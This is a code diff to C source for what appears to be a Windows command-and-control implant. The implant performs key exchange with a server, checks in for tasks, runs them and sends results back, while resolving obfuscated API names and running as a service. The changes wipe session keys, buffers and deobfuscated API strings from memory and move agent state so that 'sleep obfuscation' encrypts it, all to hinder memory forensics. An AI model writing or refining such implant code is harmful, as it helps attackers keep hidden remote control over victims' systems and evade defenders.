@@ -97,6 +97,7 @@ static BOOL send_result_chunk(AgentState *state, const unsigned char *task_id,
     Buffer res_cmd;
     buf_init(&res_cmd, res_body.len + 16);
     command_pack(&res_cmd, CMD_TASK_RESULT, res_body.data, res_body.len);
+    if (res_body.data) SecureZeroMemory(res_body.data, res_body.len);
     buf_free(&res_body);
 
     unsigned char res_nonce[NONCE_SIZE];
@@ -113,14 +114,18 @@ static BOOL send_result_chunk(AgentState *state, const unsigned char *task_id,
         buf_init(&res_pkt, res_enc_len + HEADER_SIZE);
         packet_pack(&res_pkt, res_enc, res_enc_len,
                    state->msg_id++, CONFIG_MAGIC);
+        SecureZeroMemory(res_enc, res_enc_len);
         free(res_enc);
 
         unsigned char *ack = NULL;
         DWORD ack_len;
         ok = channel_send_recv(res_pkt.data, res_pkt.len, &ack, &ack_len);
-        if (ack) free(ack);
+        if (ack) { SecureZeroMemory(ack, ack_len); free(ack); }
+        if (res_pkt.data) SecureZeroMemory(res_pkt.data, res_pkt.len);
         buf_free(&res_pkt);
     }
+    SecureZeroMemory(res_nonce, sizeof(res_nonce));
+    if (res_cmd.data) SecureZeroMemory(res_cmd.data, res_cmd.len);
     buf_free(&res_cmd);
     return ok;
 }
@@ -248,13 +253,17 @@ BOOL agent_key_exchange(AgentState *state) {
     Buffer pkt;
     buf_init(&pkt, 512);
     packet_pack(&pkt, rsa_ct, rsa_ct_len, state->msg_id++, CONFIG_MAGIC);
+    SecureZeroMemory(rsa_ct, rsa_ct_len);
     free(rsa_ct);
+    SecureZeroMemory(kex_payload, sizeof(kex_payload));
+    SecureZeroMemory(my_pub, sizeof(my_pub));
 
     /* Step 5: Send via HTTP */
     unsigned char *resp_raw = NULL;
     DWORD resp_raw_len;
     DBG("[kex] sending packet (%u bytes) via channel", pkt.len);
     BOOL ok = channel_send_recv(pkt.data, pkt.len, &resp_raw, &resp_raw_len);
+    if (pkt.data) SecureZeroMemory(pkt.data, pkt.len);
     buf_free(&pkt);
 
     if (!ok || !resp_raw) {
@@ -269,6 +278,7 @@ BOOL agent_key_exchange(AgentState *state) {
     if (!packet_unpack_header(resp_raw, resp_raw_len, &magic, &size, &msg_id) ||
         magic != CONFIG_MAGIC) {
         DBG("[kex] packet header invalid (magic=0x%08X, expected=0x%08X)", magic, CONFIG_MAGIC);
+        SecureZeroMemory(resp_raw, resp_raw_len);
         free(resp_raw);
         ecdh_free_key(my_priv);
         return FALSE;
@@ -347,6 +357,7 @@ BOOL agent_key_exchange(AgentState *state) {
 
     /* Parse: HEADER(12) + SERVER_PUB(65) + ENCRYPTED_RESPONSE */
     if (resp_raw_len < HEADER_SIZE + ECDH_PUBKEY_SIZE + NONCE_SIZE + TAG_SIZE) {
+        SecureZeroMemory(resp_raw, resp_raw_len);
         free(resp_raw);
         ecdh_free_key(my_priv);
         return FALSE;
@@ -361,6 +372,7 @@ BOOL agent_key_exchange(AgentState *state) {
     DBG("[kex] deriving ECDH shared secret");
     if (!ecdh_derive_shared_secret(my_priv, server_pub, shared_secret)) {
         DBG("[kex] ecdh_derive_shared_secret FAILED");
+        SecureZeroMemory(resp_raw, resp_raw_len);
         free(resp_raw);
         ecdh_free_key(my_priv);
         return FALSE;
@@ -378,6 +390,7 @@ BOOL agent_key_exchange(AgentState *state) {
                      state->session_key, KEY_SIZE)) {
         SecureZeroMemory(hkdf_info, sizeof(hkdf_info));
         SecureZeroMemory(shared_secret, 32);
+        SecureZeroMemory(resp_raw, resp_raw_len);
         free(resp_raw);
         return FALSE;
     }
@@ -399,19 +412,24 @@ BOOL agent_key_exchange(AgentState *state) {
         if (command_unpack(resp_pt, resp_pt_len, &cmd, &body, &body_len)) {
             if (cmd != CMD_KEY_EXCHANGE_RESP) {
                 DBG("[kex] unexpected cmd=0x%02X (expected KEY_EXCHANGE_RESP)", cmd);
+                SecureZeroMemory(resp_pt, resp_pt_len);
                 free(resp_pt);
+                SecureZeroMemory(resp_raw, resp_raw_len);
                 free(resp_raw);
                 return FALSE;
             }
             DBG("[kex] KEY_EXCHANGE complete — session established!");
         }
+        SecureZeroMemory(resp_pt, resp_pt_len);
         free(resp_pt);
     } else {
         DBG("[kex] AES-GCM decrypt FAILED (enc_len=%u)", encrypted_resp_len);
+        SecureZeroMemory(resp_raw, resp_raw_len);
         free(resp_raw);
         return FALSE;
     }
 
+    SecureZeroMemory(resp_raw, resp_raw_len);
     free(resp_raw);
     return TRUE;
 }
@@ -438,6 +456,7 @@ BOOL agent_checkin(AgentState *state) {
     Buffer cmd;
     buf_init(&cmd, body.len + 16);
     command_pack(&cmd, CMD_CHECKIN_REQUEST, body.data, body.len);
+    if (body.data) SecureZeroMemory(body.data, body.len);
     buf_free(&body);
 
     /* Encrypt */
@@ -449,21 +468,27 @@ BOOL agent_checkin(AgentState *state) {
     DWORD enc_len;
     if (!aes_gcm_encrypt(state->session_key, nonce,
                          cmd.data, cmd.len, &encrypted, &enc_len)) {
+        if (cmd.data) SecureZeroMemory(cmd.data, cmd.len);
         buf_free(&cmd);
+        SecureZeroMemory(nonce, sizeof(nonce));
         return FALSE;
     }
+    if (cmd.data) SecureZeroMemory(cmd.data, cmd.len);
     buf_free(&cmd);
+    SecureZeroMemory(nonce, sizeof(nonce));
 
     /* Frame packet */
     Buffer pkt;
     buf_init(&pkt, enc_len + HEADER_SIZE);
     packet_pack(&pkt, encrypted, enc_len, state->msg_id++, CONFIG_MAGIC);
+    SecureZeroMemory(encrypted, enc_len);
     free(encrypted);
 
     /* Send and receive */
     unsigned char *resp_raw = NULL;
     DWORD resp_raw_len;
     BOOL ok = channel_send_recv(pkt.data, pkt.len, &resp_raw, &resp_raw_len);
+    if (pkt.data) SecureZeroMemory(pkt.data, pkt.len);
     buf_free(&pkt);
 
     if (!ok || !resp_raw) {
@@ -477,6 +502,7 @@ BOOL agent_checkin(AgentState *state) {
     if (!packet_unpack_header(resp_raw, resp_raw_len, &magic, &size, &msg_id) ||
         magic != CONFIG_MAGIC) {
         DBG("[checkin] bad packet header");
+        SecureZeroMemory(resp_raw, resp_raw_len);
         free(resp_raw);
         return FALSE;
     }
@@ -490,10 +516,12 @@ BOOL agent_checkin(AgentState *state) {
     if (!aes_gcm_decrypt(state->session_key, enc_payload, enc_payload_len,
                          &plaintext, &pt_len)) {
         DBG("[checkin] decrypt FAILED");
+        SecureZeroMemory(resp_raw, resp_raw_len);
         free(resp_raw);
         return FALSE;
     }
     DBG("[checkin] decrypt OK, processing tasks");
+    SecureZeroMemory(resp_raw, resp_raw_len);
     free(resp_raw);
 
     /* Parse command */
@@ -502,6 +530,7 @@ BOOL agent_checkin(AgentState *state) {
     DWORD resp_body_len;
     if (!command_unpack(plaintext, pt_len, &resp_cmd, &resp_body, &resp_body_len) ||
         resp_cmd != CMD_CHECKIN_RESPONSE) {
+        SecureZeroMemory(plaintext, pt_len);
         free(plaintext);
         return FALSE;
     }
@@ -531,6 +560,8 @@ BOOL agent_checkin(AgentState *state) {
                     if (current_task.task_type == TASK_EXIT) {
                         DBG("[task] EXIT task received (mid-queue) — shutting down");
                         state->running = FALSE;
+                        SecureZeroMemory(&current_task, sizeof(current_task));
+                        SecureZeroMemory(plaintext, pt_len);
                         free(plaintext);
                         return TRUE;
                     }
@@ -576,7 +607,7 @@ BOOL agent_checkin(AgentState *state) {
                     BOOL send_ok = send_task_result(state, current_task.task_id,
                                     result, result_len, success);
                     DBG("[task] send_task_result: %s", send_ok ? "OK" : "FAILED");
-                    if (result) free(result);
+                    if (result) { SecureZeroMemory(result, result_len); free(result); }
                 }
 
                 /* Start new task */
@@ -642,6 +673,8 @@ BOOL agent_checkin(AgentState *state) {
         if (current_task.task_type == TASK_EXIT) {
             DBG("[task] EXIT task received — shutting down");
             state->running = FALSE;
+            SecureZeroMemory(&current_task, sizeof(current_task));
+            SecureZeroMemory(plaintext, pt_len);
             free(plaintext);
             return TRUE;
         }
@@ -690,12 +723,14 @@ BOOL agent_checkin(AgentState *state) {
             BOOL send_ok = send_task_result(state, current_task.task_id,
                             result, result_len, success);
             DBG("[task] send_task_result: %s", send_ok ? "OK" : "FAILED");
-            if (result) free(result);
+            if (result) { SecureZeroMemory(result, result_len); free(result); }
         } else {
             DBG("[task] unknown task_type=0x%02X, skipping", current_task.task_type);
         }
     }
 
+    SecureZeroMemory(&current_task, sizeof(current_task));
+    SecureZeroMemory(plaintext, pt_len);
     free(plaintext);
     return TRUE;
 }
@@ -898,6 +933,12 @@ static BOOL _try_service_dispatch(void) {
     g_pSetServiceStatus =
         (fn_SetServiceStatus)GetProcAddress(hAdv, _s3);
 
+    /* Wipe deobfuscated API names from stack */
+    SecureZeroMemory(_adv, sizeof(_adv));
+    SecureZeroMemory(_s1, sizeof(_s1));
+    SecureZeroMemory(_s2, sizeof(_s2));
+    SecureZeroMemory(_s3, sizeof(_s3));
+
     if (!pStart || !g_pRegisterSvcCtrlHandler || !g_pSetServiceStatus)
         return FALSE;
 
@@ -923,7 +964,9 @@ static BOOL _try_service_dispatch(void) {
 /* ─── Entry point ─── */
 
 int main(void) {
-    AgentState state;
+    /* static → lives in PE .bss section → encrypted by sleep obfuscation.
+     * On the stack, session_key would sit in cleartext during sleep. */
+    static AgentState state;
 
     /*
      * ── EARLY DIAGNOSTIC — Pure Win32 APIs only, ZERO CRT dependency ──
